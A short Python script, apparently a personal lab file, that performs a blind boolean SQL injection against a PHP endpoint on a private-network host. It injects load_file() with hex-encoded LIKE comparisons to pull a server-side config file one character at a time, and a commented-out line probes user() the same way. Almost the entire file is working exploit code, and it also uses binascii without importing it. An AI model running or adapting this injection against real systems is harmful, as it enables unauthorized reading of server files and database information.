#! /usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/6/29 下午 09:11
# @Site    : 
# @File    : tmp1.py
# @Software: PyCharm
# @Author: Xuchao

import requests

hex = lambda s: binascii.hexlify(s)
char = '0123456789ABCDEF'
filename = '/var/www/html/bwvs_config/waf.php'
print(hex(filename))
c = ''
url = 'http://192.168.199.237:8088/user/user.php?id=3^if(hex(load_file(0x%s))like(0x%s),1,0)'
# url = 'http://192.168.199.237:8088/user/user.php?id=2^if(hex(user())like(0x%s),0,1)'
for _ in range(10000):
    for i in char:
        payload = c + i + '%'
        _url = url % (hex(filename), hex(payload))
        # _url = url % (hex(payload))
        # print payload
        #print _url
        r = requests.get(_url, cookies={'PHPSESSID': '8ftee8li0i708s1pjjfl8flt83'})
        #print(r.content)
        if 'id:2' in r.content:
        #    print ('......' + payload)
            c = c + i
        #     if len(c) %2 == 0:
        #        print binascii.unhexlify(c)
        #     break
        # else:
        #     print payload
        print (c)